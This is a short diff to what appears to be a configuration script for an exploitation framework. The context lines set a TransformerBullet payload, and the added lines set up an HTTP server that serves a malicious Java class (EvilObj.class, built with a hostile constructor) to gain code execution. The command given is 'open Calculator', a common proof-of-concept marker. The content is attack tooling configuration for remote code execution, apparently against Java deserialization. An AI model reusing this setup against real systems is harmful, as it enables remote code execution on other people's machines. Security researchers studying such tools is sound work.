@@ -13,3 +13,13 @@ use bullet TransformerBullet
 set lport 8888
 set args "open /System/Applications/Calculator.app"
 set version 3
+
+use exploit SimpleHTTPServer
+use payload EvilFileWrapper
+use bullet ClassWithEvilConstructor
+set lport 8080
+set path /EvilObj.class
+set classname EvilObj
+set body "open /System/Applications/Calculator.app"
+set type class
+
